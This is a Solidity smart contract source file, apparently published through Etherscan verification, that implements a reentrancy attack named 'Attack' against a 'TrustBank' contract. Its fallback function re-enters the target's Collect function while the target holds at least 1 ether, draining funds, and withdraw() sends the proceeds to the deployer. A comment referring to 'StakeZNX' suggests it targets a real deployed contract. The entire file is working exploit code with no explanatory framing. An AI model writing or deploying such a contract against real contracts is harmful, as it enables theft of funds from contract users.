/**
 *Submitted for verification at Etherscan.io on 2022-03-10
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.4.25;

interface ITrustBank {
    function Put(uint) external payable;
    function Collect(uint) external payable;
}

contract Attack {
    ITrustBank public trustbank;
    address public tbAddress;
    address public owner;

    constructor(address _tbAddress) public {
        tbAddress = _tbAddress;
        trustbank = ITrustBank(_tbAddress);
        owner = msg.sender;
    }

    // Fallback is called when StakeZNX sends Ether to this contract.
    function() external payable {
        if (address(trustbank).balance >= 1 ether) {
            trustbank.Collect(1 ether);
        }
    }

    function put() external payable {
        require(msg.value >= 1 ether, "value lt 1 ether");
        trustbank.Put.value(1 ether)(0);

        // address(trustbank).call{value: 1 ether};
        // (abi.encodeWithSignature("Put(uint)", 0));
    }

    function attack() external payable {
        trustbank.Collect(1 ether);
        // (abi.encodeWithSignature("Collect(uint)", 10 ether));
    }

    function withdraw() external {
        owner.transfer(address(this).balance);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}